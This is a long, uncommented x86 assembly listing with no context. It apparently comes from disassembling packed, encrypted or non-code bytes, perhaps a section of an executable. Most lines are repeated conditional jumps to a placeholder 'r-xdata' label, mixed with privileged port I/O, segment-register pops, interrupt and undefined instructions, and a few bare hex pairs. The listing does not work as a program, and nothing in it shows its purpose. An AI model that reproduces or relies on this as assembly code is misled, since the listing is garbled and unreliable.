jecxz r-xdata
jae r-xdata
pushfd
out 0xe3 eax
in al dx
int1
xlat
jecxz r-xdata
out 0x8b eax
jecxz r-xdata
jae r-xdata
sbb al 0x60
xchg edi eax
mul ebx
outsb
fnstsw ax
pushad
mov edi 0xdc0af7c7
add ecx [ edx ]
jae r-xdata
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
sbb al 0x96
out dx eax
mov ebx esp
push 0xffffffa6
jae r-xdata
pop ds
jae r-xdata
mov ebx 0xb32354ec
jae r-xdata
pushad
cwde
mov esi 0xa9189b3
jae r-xdata
jae r-xdata
jecxz r-xdata
sbb bl [ esp + ebx ]
jae r-xdata
inc ebp

push 0xffffffa6
out dx eax
or dh [ eax ]
pop es
sbb al 0x66
jae r-xdata
sbb al 0x60
jecxz r-xdata
sbb ebp [ edx - 0x5a ]
jae r-xdata
pop es
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0x1c
pushad
in al dx
jae r-xdata
sbb al 0x1c
call 0x612a10dd
jecxz r-xdata
mov [ ecx - 0x1c0934f6 ] edx
jae r-xdata
std
sbb al 0x73
jae r-xdata
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
daa
out dx eax
outsb
cmpsb [ esi ] [ edi ]
aaa
mov bl 0x1c
xchg ebp eax
mov bl 0xa
cmp edi eax
jecxz r-xdata
in al dx
inc ecx
push 0xffffffbe
pop ds
push 0xffffffae
pop ss
push 0xffffffb6
sbb ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
pop ds
pop ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xa66a1ba6
or ebp [ eax - 0x5a ]
pop ss
push 0xffffffa6
test [ eax - 0x23 ] esp
jecxz r-xdata
and esi [ ebx - 0x6ff4da98 ]
jae r-xdata
jae r-xdata
daa
out dx eax
mov ebx esi
outsb
cmpsb [ esi ] [ edi ]
pop es
mov al 0xb3
or ecx [ ebx + 0x17 ]
sbb al 0x1c
or bl [ edi + 0x731c1c19 ]
jae r-xdata
or edx [ edi + edx + 0x1c ]
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x60
imul esi [ eax + 0x17540bb3 ] 0x1c
lahf
mov edx 0xcf0a2366
adc [ esp + ebx ] bl
or ebp ebx
sahf
loope r-xdata
mov dh 0xa
xor [ edi ] al
jae r-xdata
push 0xffffffa6
pop ss
mov al 0xb3
or esi [ eax + edx ]
sbb al 0x1c
pushad
mov bl 0x25
cmpsb [ esi ] [ edi ]
sbb al 0xe3
or edi [ 0xffffffffb31c1c0e ]
cmpsb [ esi ] [ edi ]
sbb al 0xb5
mov bl 0xa
mov ch cl
jecxz r-xdata
rcl [ edi ] cl
sbb al 0x1c
mov [ edi + 0x1c87666e ] esp
sbb al 0x1c
mov ch 0xb3
or cl [ edx + 0x73e3e3e9 ]
jae r-xdata
adc bx si
jecxz r-xdata
push 0x17900b25
jae r-xdata
jae r-xdata
pop ss
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
or cl [ ebx + 0xa ]
sbb al 0x1c
jae r-xdata
sbb al 0x1c
in al 0xfb
sub dh [ ebp - 0x49957a4d ]
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
sbb al 0xb3
outsb
aaa
push ds
sbb al 0x1c
mov bl 0xb
mov [ 0x60e3e3eb ] al
sbb al 0xb3
or dl [ eax ]
add eax 0xec731c1c
push 0xffffffa6
jae r-xdata
outsb
or ah [ esi + 0x1 ]
daa
out dx eax
push 0xffffffa7
or edx [ eax + 0x601c1c17 ]
jae r-xdata
movsd [ edi ] [ esi ]
jecxz r-xdata
test [ eax - 0x68 ] esp
mov dl 0xb3
sbb al 0x96
pop es
sbb al 0xb4
push 0xa6e01ba3
pop ds
jae r-xdata
sbb al 0x1c
jae r-xdata
iretd
add eax 0xf9920abb
jecxz r-xdata
test [ edx - 0x5a ] ebp
jecxz r-xdata
mov [ ebx + edi * 4 + 0x6a859389 ] ecx
or dl [ ebx + 0x73e3e3fc ]
jae r-xdata
add eax 0x13ae6a85
or dl [ edi + 0x1d ]
mov bl 0x85
jae r-xdata
mov ch 0xe2
jecxz r-xdata
sahf
out 0xe3 eax
jecxz r-xdata
jae r-xdata
rcr [ eax + ebp * 2 ] 0x1
xchg edi eax
jae r-xdata
pop ss
push 0x9e6a851d
pop ebp
xchg [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
mov ebx 0xe3f9920a
jecxz r-xdata
jae r-xdata
or [ esp + ebx ] ebx
cmpsd [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
cld
jae r-xdata
push 0xffffffb6
jae r-xdata
jecxz r-xdata
or edx [ esi ]
sbb al 0x1c
mov [ 0xb666eb3 ] eax
pop ds
movsb [ edi ] [ esi ]
ficomp [ eax - 0x4a991335 ]
loop r-xdata
sbb bl [ esp + ebx ]
rcl [ 0x67ec2366 ] 0x1
bswap ebx
pushad
fucom st3
in al dx
and ecx [ ecx - 0x59957a09 ]
jae r-xdata
pop ss
pushad
and ch bl
or ah ah
sbb ebx [ esp + ebx ]
jae r-xdata
push 0xd0075e97
sub ch [ eax - 0x42 ]
pop ss
push 0x1c193035
jae r-xdata
cmpsb [ esi ] [ edi ]
xor edi [ ebx + 0x6a858689 ]
cmpsb [ esi ] [ edi ]
cmp [ esi - 0x5a ] ch
jae r-xdata
jecxz r-xdata
and bp sp
bswap ebx
jecxz r-xdata
arpl [ esi + 0x66ece1f3 ] bx
in al 0xfb
retn
jae r-xdata
jae r-xdata
outsb
jae r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xa66a1fa6
sub ah [ eax ]
jae r-xdata
jecxz r-xdata
out 0xe3 ax
adc [ 0xffffffffec731c1c ] al
sbb al 0x1c
jae r-xdata
jecxz r-xdata
sbb al 0xb3
or ebx eax
push cs
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
and edx eax
test [ ebp - 0x7ae45996 ] 0x6e0dae6a
test [ edx - 0x5a ] ebp
or eax 0x1c1fe50a
sbb al 0x73
jae r-xdata
pop esi
pop es
jae r-xdata
mov bl 0xec
push esp
in al 0xb3
test [ eax - 0x5c ] ebp
loope r-xdata
push esp
jae r-xdata
sar [ ebx + 0x6a85c689 ] 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
imul esi [ ebx + ecx - 0x1c1c17dd ] 0xbaba3b68
push 0xffffffbe
pop ds
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
adc ecx [ edx ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
mov bl 0x6e
nop [ esp + ebx ] bx
mov bl 0x68
adc al 0xb
jpo r-xdata
mov bl 0x6e
or bx [ edi ]
and ecx [ edx ]
test [ esi ] dl
sbb al 0x1c
mov bl 0xb
fmul [ esi ]
pushad
daa
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
loopne r-xdata
push ss
shr [ edx ] 0x1
jae r-xdata
shr [ edx ] 0x1
jae r-xdata
xor [ edx ] ecx
push edx
out 0xe3 eax
jecxz r-xdata
push 0xffffffa6
loopne r-xdata
mov bl 0x68
jae r-xdata
mov ch 0x1c
mov ah 0xaf
push 0x65
dec ebx
jecxz r-xdata
xchg esi eax
test [ edx - 0x4a ] ebp
and bp sp
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
jecxz r-xdata
push 0xc30f600f
mov al 0xa
int 0x12
sbb al 0x1c
jae r-xdata
in al dx
mov bx 0xe3c9
jecxz r-xdata
outsb
push di
sbb ebx [ esp + ebx ]
mov bl 0xd0
cmp [ eax - 0x1c3dc5f6 ] dh
jecxz r-xdata
jae r-xdata
jae r-xdata
imul ebx [ bx + di ] 0xc18b1c1c
loope r-xdata
sbb al 0xec
jae r-xdata
jae r-xdata
push edi
sbb eax 0x73731c1c
jae r-xdata
jae r-xdata
daa
sub ah [ eax ]
in al dx
xchg ebp ebp
pushad
cmpsb [ esi ] [ edi ]
sbb eax [ ebp + 0x6e0dae6a ]
push 0xffffffa6
adc eax 0xf78923d0
test [ edx - 0x5a ] ebp
enter 0xe3e3 0x73
jae r-xdata
mov ch 0xb3
jae r-xdata
push 0x356817be
xor [ ecx ] bl
sbb al 0xa6
or ch [ eax ]
jmp r-xdata
int 0xe3
jecxz r-xdata
and eax 0x1c17900b
sbb al 0x60
jae r-xdata
jae r-xdata
jecxz r-xdata
out dx eax
and ebp esp
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp ah ch
or esp [ ebx ]
call 0x3baf13a6
mov edx 0x1fbe6aba
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov esi 0xc9a00a1f
jae r-xdata
jae r-xdata
add edi [ ebx - 0x4ff56f77 ]
mov ecx eax
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
test [ edx - 0x4a ] ebp
jae r-xdata
push es
sbb al 0x1c
jae r-xdata
jae r-xdata
nop
jae r-xdata
loop r-xdata
jae r-xdata
mov ch 0xb4
or dh ah
or [ esp + ebx ] ebx
jae r-xdata
mov edi 0x60e3e3e9
loope r-xdata
out dx eax
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx esp
jae r-xdata
shl [ ebx ] 0x1
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x7373202a ] eax
xchg esi eax
mov ebx 0x6a85c689
cmpsb [ esi ] [ edi ]
mov [ esi + 0xfb66a85 ] edx
mov ecx 0xdb66a85
mov [ esi - 0x1c1f5af6 ] ecx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
mov dh 0x5
test [ edx - 0x52 ] ebp
mov eax 0x7373202a
sar [ eax ] 0x1
outsb
cmpsb [ esi ] [ edi ]
xchg ebp eax
or ch dh

push 0x9e6a8518
and ebp [ eax + 0x1a ]
or dl [ edx + 0x73e3e3cd ]
sbb eax 0x5d9e6a85
mov ebp ecx
jecxz r-xdata
sbb al 0x96
jae r-xdata
and al dl
jae r-xdata
jecxz r-xdata
jmp r-xdata
xchg ebx eax
sbb [ esp + ebx ] ebx
mov edi esp
mov esp ebx
shl ebx cl
jecxz r-xdata
push 0x6ababa3b
mov esi 0xec38661f
jecxz r-xdata
stosd [ edi ]
retn
mov dl 0xb4
push 0x4b741c1b
in al dx
adc ax 0xe3fb
jecxz r-xdata
and esp [ ebx + 0x7373202a ]
mov al 0xa
dec ecx
int1
jecxz r-xdata
in al dx
jecxz r-xdata
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
aas
fsub [ ebp - 0x44991329 ]
leave
jecxz r-xdata
dec ebx
and ebp esp
fld st5
jecxz r-xdata
jae r-xdata
lahf
push ds
sbb al 0x1c
mov bl 0xd0
adc eax 0xafb41cb5
cmp dh ah
and eax 0x688bd0e7
mov esi 0xe0f8681f
xor ch [ edx - 0x41 ]
shr eax cl
test eax ebx
xor ch ah
or ecx [ edx ]
jae r-xdata
sub ah dh
pop ecx
jae r-xdata
and esi [ ebx - 0x200f54d ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jge r-xdata
jae r-xdata
sub ebx edi
sbb al 0xb4
iretd
daa
mov [ 0x25d2308b ] eax
or edi [ edi + 0x60e3e3e9 ]
jae r-xdata
jecxz r-xdata
fidivr [ esi - 0x365ff5e1 ]
jae r-xdata
jae r-xdata
pushad
xchg [ edi ] bl
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0xf6
jecxz r-xdata
and esp esi
mov [ edx ] ch
out 0x59 al
and eax 0x73e3e3ea
jae r-xdata
enter 0xe3f1 0xe3
push 0x54ec1bbe
fdiv [ edx ]
in al dx
jecxz r-xdata
test [ edx - 0x9 ] ebp
push 0x9e6a851d
sbb eax edx
sbb al 0xa
or ebp [ ebx + 0x1ce3e3fc ]
pop edi
mov bl 0xa
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffa6
pop ss
push 0xffffffa6
sbb ecx [ edx ]
lar ebx [ esp + ebx ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
or ch [ ebx + 0x73e3e3c3 ]
jae r-xdata
jae r-xdata
ud1 eax [ ebp - 0x76f24996 ]
push 0xffffffb6
lahf
adc [ esp + ebx ] bl
or bh ch
rcl [ 0x65ec20d8 ] 0x1
mov bl 0x24
jecxz r-xdata
std
jecxz r-xdata
mov ebx 0xb00a9089
and [ ebx + 0x73 ] dh
or dl dh
scasb [ edi ]
sub eax 0x731c1c07
jae r-xdata
xchg esi eax
jae r-xdata
push cs
sbb al 0x1c
or bl [ eax - 0x761c1c10 ]
jecxz r-xdata
shr edi cl
and eax 0x20f3d3a7
xchg edi eax
jae r-xdata
jae r-xdata
jae r-xdata
retn 0xe3e3
sbb al 0xa
std
daa
out dx eax
ficomp [ eax + 0x1566ecdf ]
sti
cmpsb [ esi ] [ edi ]
adc esi [ ebx + 0xa4ba66e ]
jae r-xdata
mov ch 0xb4
push 0xffffffa6
pop ds
or ch [ ecx ]
sti
sbb al 0x30
push 0xec156613
mov ch 0x19
sbb al 0x1c
mov ebx [ edi + 0x38 ]
dec eax
pop esi
mov ah 0x6a
pop ebp
daa
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x68
sbb ebx [ esp + esi * 2 ]
dec ebx
push 0xa1c661b
jecxz r-xdata
sbb eax 0x119e6a85
or al [ edi ]
jae r-xdata
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffff97
jecxz r-xdata
jae r-xdata
or ah [ 0x73e3e3ea ]
jae r-xdata
mov bl 0x6e
jae r-xdata
movnti [ eax + 0x1c12cd0a ] esi
sbb al 0x73
jae r-xdata
push es
sbb al 0xa
jecxz r-xdata
jae r-xdata
stosd [ edi ]
shl bl 0xe3
scasb [ di ]
pop ss
sbb al 0x1c
jae r-xdata
push 0x9e6a851d
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
pop edi
adc [ edx ] ecx
pop es
push 0xffffff9e
adc ebp [ eax + 0x1d ]
jecxz r-xdata
jmp 0x27a7150a
jecxz r-xdata
0x7373e3e3 0x3888
outsb
cmpsb [ esi ] [ edi ]
jecxz r-xdata
jae r-xdata
call [ ecx ]
sbb al 0x1c
outsd
pop ds
adc al 0x1c
sbb al 0x89
jecxz r-xdata
outsb
sub bx [ esi ]
sbb al 0x1c
mov bl 0xa
sbb eax [ ebx ]
sbb al 0x1c
jae r-xdata
sbb al 0x65
test [ edx - 0x62 ] ebp
in al dx
jae r-xdata
or ah [ ebx - 0x3f ]
jae r-xdata
pushfd
shl ebx cl
jecxz r-xdata
push ebx
mov ch 0x68
sbb eax 0x199e6a85
rcr [ edx + ecx ] 0x1
jae r-xdata
shl [ ebx ] 0x1
mov bl 0xb3
or bh bh
std
sbb esp [ esi + 0x1c ]
or cl [ ebx + 0x73e3e3e9 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or al 0x14
sbb al 0x1c
mov ah 0x12
sbb al 0x1c
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
cmpsb [ esi ] [ edi ]

stosd [ edi ]
loope r-xdata
sbb ebp esp
push esp
xlat
jecxz r-xdata
pop ds
loopne r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ 0x731c1c07 ]
jae r-xdata
mov [ edi - 0x1c1fe6f6 ] eax
jecxz r-xdata
and edi [ edx + ebp + 0x73737320 ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
and [ ebx ] esi
or cl bh
out dx al
jecxz r-xdata
add [ ebx + 0x6a85aa89 ] edi
cmpsb [ esi ] [ edi ]
pop es
mov ebx 0x6a858789
cmpsb [ esi ] [ edi ]
add eax 0x858689bb
push 0xffffffa6
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cld
jecxz r-xdata
push 0xffffffa6
sbb ecx [ edx ]
mov [ 0x73e3e3ee ] eax
in al dx
pop es
jae r-xdata
bound ebx [ ebp + 0x5f ]
push 0xdf0f600f
mov al 0xd0
and esi [ ebp - 0x1c0431f6 ]
jecxz r-xdata
jae r-xdata
jae r-xdata
mov ah 0xb3
mov esp 0x73202abd
jae r-xdata
jecxz r-xdata
pop ebp
pop edi
outsb
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jecxz r-xdata
jae r-xdata
jae r-xdata
hlt
push 0xffffffa6
jae r-xdata
mov al 0x3e
jae r-xdata
pop edi
mov bl 0x68
and eax 0x1c0b3d0a
sbb al 0x73
test [ eax - 0x26 ] esp
jecxz r-xdata
and ecx [ edx ]
imul eax [ edi ] 0x1c
sbb al 0x73
jae r-xdata
mov dh 0xa
shl bh 0xe3
aas
jae r-xdata
mov ebx 0x6a858d89
cmpsb [ esi ] [ edi ]
aaa
mov ebx 0xe20a9789
add ebx [ esp + ebx ]
jae r-xdata
mov ebp 0x73e3e3ce
in al dx
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
in al dx
mov al [ 0xffffffffbc1c1c16 ]
push 0x3fe50a25
aad 0x1
jae r-xdata
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
loop r-xdata
xor al [ ebp - 0x2fec4996 ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
pop ds
jae r-xdata
sub [ ecx + 0x6a859489 ] edi
sbb al 0x97
sbb al 0x1c
jae r-xdata
pop edi
lea esi [ ebp - 0x1af55152 ]
cmp eax 0x73731c1c
mov ebx eax
test [ edx - 0x5a ] ebp
or [ ebx - 0x1c3887f6 ] edi
jecxz r-xdata
daa
stosd [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
jecxz r-xdata
mov [ esi + 0xba66a85 ] eax
jae r-xdata
or dh dh
add [ esp + ebx ] ebx
jae r-xdata
sbb al 0xc8
adc ah [ edi + 0x31 ]
jecxz r-xdata
sbb al 0x1c
mov esp 0xe50a2568
xchg esi eax
sbb al 0x1c
aad 0x1
jae r-xdata
or edi [ ebx - 0x1c3e9cf6 ]
mov ebx 0x6a858689
push esp
test [ edx - 0x9 ] ebp
in eax dx
test [ esi + 0x31 ] esp
in al dx
enter 0x6712 0x31
add [ esp + ebx ] ebx
jae r-xdata
jo r-xdata
xor esp ebp
jecxz r-xdata
jae r-xdata
jmp 0xffffffffb5f7176c
jae r-xdata
or ch [ eax + 0x731c1c19 ]
jae r-xdata
jae r-xdata
jae r-xdata
mov esi 0x2b66ecf3
aas
jae r-xdata
xor [ ebp - 0x46ee4996 ] eax
mov [ edi + 0x2bb66a85 ] ecx
push 0xffffffb6
jae r-xdata
jae r-xdata
mov dh 0x2f
and bp sp
or bh dh
mul ebx
cmpsb [ esi ] [ edi ]
nop
and ebp esp
jae r-xdata
mov ecx 0xe3f4f20a
jecxz r-xdata
xchg esp eax
test [ edx - 0x4a ] ebp
das
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ ebp + 0x73e3e3ce ]
retn
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
xchg [ edx ] ecx
sbb eax esp
jecxz r-xdata
jae r-xdata
mov ebp 0xeba66820
push 0xffffffa6
pop ds
or dl [ ecx + 0x731c1c1c ]
jae r-xdata
jae r-xdata
jae r-xdata
or bh bh
adc [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
stc
jecxz r-xdata
jae r-xdata
sbb al 0x1c
in al dx
sub di [ edi ]
jae r-xdata
sbb al 0xa
mov esp 0x731c1c3e
jae r-xdata
ja 0xffffffffb12a1771
mov bl 0xb0
mov al 0x89
in al 0xb0
or dl [ edx + ecx ]
adc al 0xb
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
and ebp esp
jae r-xdata
test [ edx - 0x42 ] ebp
jae r-xdata
jae r-xdata
cmp bx [ esi ]
sbb al 0x1c
or al dh
in eax dx
jecxz r-xdata
jae r-xdata
push 0x1c1e3b66
sbb al 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
outsb
inc bx
push ss
sbb al 0x1c
or bh [ esi + edi + 0x73731c1c ]
jae r-xdata
cmp eax 0x42871c1c
adc edx eax
push 0xb66a8532
jae r-xdata
adc eax 0x120a9189
loop r-xdata
cmpsb [ esi ] [ edi ]
mov dh 0x68
punpcklbw mmx1 [ edi ]
fbstp [ eax + 0xab523d0 ]
jae r-xdata
or dh [ eax + 0x731c1c3e ]
jae r-xdata
into
sti
jecxz r-xdata
pandn mm6 [ eax + 0xab523d0 ]
jecxz r-xdata
or al al
mul ebx
pop ss
mov [ esi - 0x59957a45 ] eax
push 0xffffffa6
and bl [ edx ]
sbb al 0x1c
jae r-xdata
jecxz r-xdata
xchg [ ebp - 0x46a04996 ] eax
mov [ ecx + 0x5db66a85 ] eax
or dl [ edx - 0xf ]
jecxz r-xdata
sub edi [ edi ]
jae r-xdata
and ecx [ edx ]
jae r-xdata
mov ch 0xb4
push 0xa38d01b
sbb al 0x1c
jae r-xdata
jae r-xdata
mov esi 0x9e6a8505
jae r-xdata
add eax 0x159e6a85
mov esi 0xb66a8507
jae r-xdata
jecxz r-xdata
jae r-xdata
push 0xffffffbe
jae r-xdata
sbb al 0x1c
jae r-xdata
and esp ebx
mov ebx 0xe3c1630a
jae r-xdata
and esp ebx
jecxz r-xdata
or ah [ esi - 0x78e3e3c3 ]
inc edx
jae r-xdata
or ah ah
hlt
test [ edx - 0x4a ] ebp
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
in eax 0xe3
mov edi 0x1c1bcf0a
xchg edi eax
sbb al 0x1c
jae r-xdata
aad 0xb4
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
mov esp esp
mov al 0xa
adc al 0xa
and al 0xa6
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
sbb al 0xb3
jae r-xdata
jecxz r-xdata
sub ch ah
jae r-xdata
adc eax 0xbfb66a85
test [ edx - 0x62 ] ebp
jae r-xdata
mov eax [ 0xffffffff85b93a68 ]
test [ edx - 0x4a ] ebp
jae r-xdata
test [ edx - 0x5a ] ebp
sbb edx eax
and eax [ ebp + 0x6e19a66a ]
aaa
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmp eax 0x731c1c0b
fsub [ eax ]
arpl cx ax
mov eax 0xebbe6a85
or bl [ ebx + edx * 8 - 0x59971c1d ]
mov edi edx
jecxz r-xdata
push 0x65
and esp ebx
push 0xb66a8533
mov dh 0x13
shl [ ecx ] 0x1
test [ edx - 0x4a ] ebp
adc [ ecx + 0x6a858f89 ] edi
mov dh 0x2b
bound ecx [ edi ]
jae r-xdata
shr [ edx - 0x69 ] cl
test eax 0xece3e3ee
push esp
not [ edx + 0xa332160 ]
iretd
adc eax 0x65ec20d8
push 0xffffffa6
and al 0xe3
loope r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
shl ebp 0xe3
jecxz r-xdata
push 0x65
mov [ ebx - 0x1c2c1c75 ] esp
pop ebx
jae r-xdata
outsb
mov ch 0xb3
or edx [ eax ]
push cs
sbb al 0x1c
in al dx
cli
or bl [ esp + ebx ]
shl [ ebx ] 0x1
mov ah 0x1c
mov ch 0x83
or cl [ edi + 0x73e3e3e5 ]
jae r-xdata
shr [ edx ] 0x1
test [ edx - 0x15 ] ebp
and [ ebx + 0x73 ] dh
jae r-xdata
bound esp [ edi ]
jecxz r-xdata
mov [ edx - 0x7a727647 ] ecx
push 0xffffffb6
mov dh 0xbf
jecxz r-xdata
jecxz r-xdata
jae r-xdata
sahf
jae r-xdata
mov dh 0xa1
jae r-xdata
mov ecx 0x6a858d89
jae r-xdata
jae r-xdata
push 0xffffff9e
jae r-xdata
cmp bh [ ecx + 0x5be6a85 ]
xor [ edx ] ecx
test [ ecx ] 0x1c
sbb al 0x73
loopne r-xdata
mov al 0xb5
mov ah 0x68
sbb edx eax
cmp [ edx ] cl
jae r-xdata
shl [ ebx ] 0x1
mov esp 0x7373202a
jae r-xdata
jecxz r-xdata
lodsb [ esi ]
dec ecx
or ebx [ esp + ebx ]
jae r-xdata
loopne r-xdata
jae r-xdata
xchg ebp eax
mov bl 0x1c
xchg ebp eax
xlat
sbb al 0x96
pop es
or bl [ ebx + 0x73e3e3f9 ]
jae r-xdata
or bh [ edx ]
push ebx
pop edi
jecxz r-xdata
jae r-xdata
retn
or ch [ eax + 0x7373e3e3 ]
jae r-xdata
jae r-xdata
and esp ebx
jecxz r-xdata
jecxz r-xdata
jecxz r-xdata
mov ebp 0x661c1c0e
and ebp esp
out 0xe3 al
jecxz r-xdata

mov al [ 0xffffffffe3672462 ]
or esi [ esi - 0xd ]
int1
jecxz r-xdata
sub ch ah
test [ edx - 0x4a ] ebp
jae r-xdata
push 0x6a85b93a
jae r-xdata
lea eax [ ebp - 0x46424996 ]
mov [ edi - 0x1c39eff6 ] eax
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mul [ edx - 0x1c3a17f6 ]
jecxz r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov dh 0x3f
or ebx [ edx ]
0xa66ee3e3 0xa1c
sahf
jae r-xdata
sbb [ ebp - 0x5a954b12 ] bl
iretd
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ebx 0x6a859189
sbb al 0x96
test [ edx - 0x62 ] ebp
jecxz r-xdata
or cl ah
adc al 0x1c
sbb al 0x73
jae r-xdata
jae r-xdata
jecxz r-xdata
mov ebx 0x390a8289
jecxz r-xdata
jae r-xdata
int3
push 0x68f3c7af
xor al 0xb
jbe r-xdata
adc eax 0xe3cb6dec
jecxz r-xdata
cmp eax 0x1c3d6fec
sub al [ ebp + 0x7320eb6a ]
jae r-xdata
or dl [ eax ]
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov esp 0x7320b8bd
jae r-xdata
fdivr [ 0x1c3d6fec ]
and bp sp
xlat
jae r-xdata
mov ecx 0x5be6a85
jae r-xdata
push 0xffffffa5
push ds
sbb al 0x1c
or esi esi
jmp ebx
mov ebx 0x1ba66a85
shl [ ebx ] 0x1
test [ edx - 0x5a ] ebp
sbb [ esi + 0x66 ] ebp
aaa
mov edi 0x89b98a89
push 0xffffffb6
jae r-xdata
xchg ecx ebp
jae r-xdata
jae r-xdata
jae r-xdata
push 0x9e6a8519
pop ecx
mov [ esi - 0x61957a44 ] edx
or al bl
sti
jecxz r-xdata
mov eax [ eax - 0x32 ]
add ah bh
mov ah 0xa
shl [ ecx ] 0x1
jae r-xdata
sbb al 0x73
cmpsb [ esi ] [ edi ]
push ebx
or bl dl
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov edx 0x66ec2366
add dh ah
cmp [ esi - 0x349213eb ] dh
jecxz r-xdata
jecxz r-xdata
xor [ ecx - 0x41957a6c ] ecx
cmp [ esp + ebx ] ebx
jae r-xdata
outsd
jecxz r-xdata
jae r-xdata
sbb [ ecx - 0x61957a65 ] ecx
jecxz r-xdata
mov esp 0x5f9e6a85
push 0xe3e3235b
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
pop ebx
jae r-xdata
jecxz r-xdata
mov esp [ edx - 0x68 ]
faddp st0
mov ah 0x6a
movsd [ edi ] [ esi ]
lahf
or eax ecx
in eax 0xe3
jae r-xdata
jecxz r-xdata
sbb al 0xb4
mov bl 0xbc
mov ebp 0x7373202a
jae r-xdata
pop ebx
jae r-xdata
mov [ ebp + eax * 4 - 0x7af84196 ] edx
push 0xffffffb6
jae r-xdata
mov edx 0x51be6a85
jae r-xdata
jae r-xdata
jecxz r-xdata
in al dx
add dh ah
out dx eax
push 0x470aeba6
shl bl 0xe3
xchg esi eax
or al [ edi - 0x40 ]
jecxz r-xdata
mov esp edi
loop r-xdata
xchg esi eax
jecxz r-xdata
jae r-xdata
sbb bl [ esp + ebx ]
add ebx esi
retn 0xb4d5
shl ebx 0xe3
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb al 0x6e
jae r-xdata
or [ esp + ebx ] bl
or cl cl
adc al 0x3b
and [ ebx + 0x73 ] dh
in al dx
jae r-xdata
sbb al 0x60
scasd [ edi ]
mov bl 0x1c
je r-xdata
cmp esp [ eax ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
mov [ 0xffffffffe3d3e38b ] eax
mov dh 0xbd
mov bh [ ecx + 0x6a858d89 ]
jae r-xdata
and bp sp
jae r-xdata
jae r-xdata
pop es
test [ edx - 0x42 ] ebp
test [ edx - 0x52 ] ebp
push 0xffffffbe
jae r-xdata
jae r-xdata
jecxz r-xdata
mov bl 0xb
or [ si ] bl
jecxz r-xdata
jecxz r-xdata
pop ebx
and eax 0x970a8a89
aas
sbb al 0x1c
outsb
aaa
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
scasb [ edi ]
push edi
outsb
cmpsb [ esi ] [ edi ]
or [ ebx + 0x6a858a89 ] edi
cmpsb [ esi ] [ edi ]
